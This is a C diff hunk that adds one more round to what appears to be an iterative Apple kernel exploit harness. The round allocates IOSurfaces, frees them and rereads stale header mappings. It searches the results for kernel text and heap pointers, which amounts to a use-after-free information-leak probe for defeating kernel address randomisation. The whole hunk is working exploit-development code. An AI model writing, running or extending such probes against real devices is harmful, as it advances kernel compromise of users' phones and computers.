@@ -18773,6 +18773,199 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 246) {
+            rlog("*** rounds=246: Header-only page reuse via IOSurface recycling ***\n");
+            
+            /* Strategy: Create surfaces, snapshot header content, free them,
+             * create new surfaces of SAME size, check if stale header mappings
+             * now show new surface metadata. 
+             * ONLY read header pages (tag=88, read-only) which persist.
+             * Do NOT read data pages which get unmapped. */
+            
+            #define N246 32
+            IOSurfaceRef s246[N246];
+            void *b246[N246];
+            mach_vm_address_t h246_start[N246];
+            size_t h246_size[N246];
+            uint64_t h246_snap[N246][64]; /* snapshot first 64 qwords of header */
+            
+            rlog("  Phase 1: Create %d surfaces and snapshot headers...\n", N246);
+            for (int i = 0; i < N246; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                s246[i] = IOSurfaceCreate(p);
+                b246[i] = s246[i] ? IOSurfaceGetBaseAddress(s246[i]) : NULL;
+                h246_start[i] = 0; h246_size[i] = 0;
+                memset(h246_snap[i], 0, sizeof(h246_snap[i]));
+                
+                if (b246[i]) {
+                    mach_vm_address_t ra = (mach_vm_address_t)b246[i] - 0x10000;
+                    while (ra < (mach_vm_address_t)b246[i]) {
+                        mach_vm_size_t rs = 0;
+                        natural_t depth = 1;
+                        struct vm_region_submap_info_64 ri;
+                        mach_msg_type_number_t rc = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        if (mach_vm_region_recurse(mach_task_self(), &ra, &rs, &depth,
+                            (vm_region_recurse_info_t)&ri, &rc) != 0) break;
+                        if (ri.user_tag == 88 && ri.protection == 1) {
+                            h246_start[i] = ra;
+                            h246_size[i] = (mach_vm_address_t)b246[i] - ra;
+                        }
+                        ra += rs;
+                    }
+                    
+                    if (h246_start[i]) {
+                        vm_offset_t data = 0;
+                        mach_msg_type_number_t cnt = 0;
+                        if (mach_vm_read(mach_task_self(), h246_start[i], 512, &data, &cnt) == 0) {
+                            memcpy(h246_snap[i], (void*)data, cnt < 512 ? cnt : 512);
+                            mach_vm_deallocate(mach_task_self(), data, cnt);
+                        }
+                    }
+                }
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            
+            int created = 0;
+            for (int i = 0; i < N246; i++) if (s246[i]) created++;
+            rlog("  Created %d, first base=%p hdr=0x%llx\n", created,
+                 b246[0], (unsigned long long)h246_start[0]);
+            
+            /* Show initial header content for first surface */
+            rlog("  Initial header[0] non-zero qwords:\n");
+            for (int j = 0; j < 64; j++) {
+                if (h246_snap[0][j] != 0) {
+                    rlog("    +%d: 0x%016llx\n", j*8, h246_snap[0][j]);
+                }
+            }
+            
+            /* Phase 2: Free ALL surfaces but keep header mapping addresses */
+            rlog("  Phase 2: Freeing all surfaces...\n");
+            for (int i = 0; i < N246; i++) {
+                if (s246[i]) {
+                    CFRelease(s246[i]);
+                    s246[i] = NULL;
+                }
+            }
+            
+            /* Phase 3: Small delay then read headers */
+            usleep(10000); /* 10ms */
+            
+            rlog("  Phase 3: Reading stale header mappings...\n");
+            int changed_count = 0;
+            for (int i = 0; i < N246; i++) {
+                if (!h246_start[i]) continue;
+                vm_offset_t data = 0;
+                mach_msg_type_number_t cnt = 0;
+                kern_return_t kr = mach_vm_read(mach_task_self(), h246_start[i], 512, &data, &cnt);
+                if (kr == 0) {
+                    uint64_t *cur = (uint64_t*)data;
+                    int changed = 0, zeroed = 0;
+                    for (int j = 0; j < 64; j++) {
+                        if (cur[j] != h246_snap[i][j]) changed++;
+                        if (h246_snap[i][j] != 0 && cur[j] == 0) zeroed++;
+                    }
+                    if (changed > 0) {
+                        changed_count++;
+                        rlog("    hdr[%d]: %d changed, %d zeroed\n", i, changed, zeroed);
+                        int d = 0;
+                        for (int j = 0; j < 64 && d < 5; j++) {
+                            if (cur[j] != h246_snap[i][j] && cur[j] != 0) {
+                                rlog("      +%d: was 0x%016llx now 0x%016llx\n",
+                                     j*8, h246_snap[i][j], cur[j]);
+                                if ((cur[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                    rlog("        *** KERNEL TEXT POINTER ***\n");
+                                if ((cur[j] >> 32) == 0xFFFFFF80ULL)
+                                    rlog("        *** KERNEL HEAP POINTER ***\n");
+                                d++;
+                            }
+                        }
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, cnt);
+                } else {
+                    rlog("    hdr[%d]: read failed kr=0x%x (unmapped)\n", i, kr);
+                }
+            }
+            rlog("  %d headers changed after free\n", changed_count);
+            
+            /* Phase 4: Create new surfaces and re-check */
+            rlog("  Phase 4: Creating %d new surfaces...\n", N246);
+            IOSurfaceRef s246b[N246];
+            for (int i = 0; i < N246; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                s246b[i] = IOSurfaceCreate(p);
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            
+            usleep(5000);
+            
+            rlog("  Phase 5: Re-reading stale headers after new surfaces created...\n");
+            int new_data_count = 0;
+            for (int i = 0; i < N246; i++) {
+                if (!h246_start[i]) continue;
+                vm_offset_t data = 0;
+                mach_msg_type_number_t cnt = 0;
+                kern_return_t kr = mach_vm_read(mach_task_self(), h246_start[i], 512, &data, &cnt);
+                if (kr == 0) {
+                    uint64_t *cur = (uint64_t*)data;
+                    int nonzero = 0;
+                    for (int j = 0; j < 64; j++) if (cur[j] != 0) nonzero++;
+                    if (nonzero > 0) {
+                        new_data_count++;
+                        int changed = 0;
+                        for (int j = 0; j < 64; j++)
+                            if (cur[j] != h246_snap[i][j]) changed++;
+                        rlog("    hdr[%d]: %d nonzero, %d changed from original\n", i, nonzero, changed);
+                        if (changed > 0) {
+                            int d = 0;
+                            for (int j = 0; j < 64 && d < 5; j++) {
+                                if (cur[j] != 0 && cur[j] != h246_snap[i][j]) {
+                                    rlog("      +%d: 0x%016llx (was 0x%016llx)\n",
+                                         j*8, cur[j], h246_snap[i][j]);
+                                    if ((cur[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                        rlog("        *** KERNEL TEXT PTR ***\n");
+                                    d++;
+                                }
+                            }
+                        }
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, cnt);
+                } else {
+                    rlog("    hdr[%d]: unmapped\n", i);
+                }
+            }
+            rlog("  %d stale headers show data after new surfaces\n", new_data_count);
+            
+            for (int i = 0; i < N246; i++) if (s246b[i]) CFRelease(s246b[i]);
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
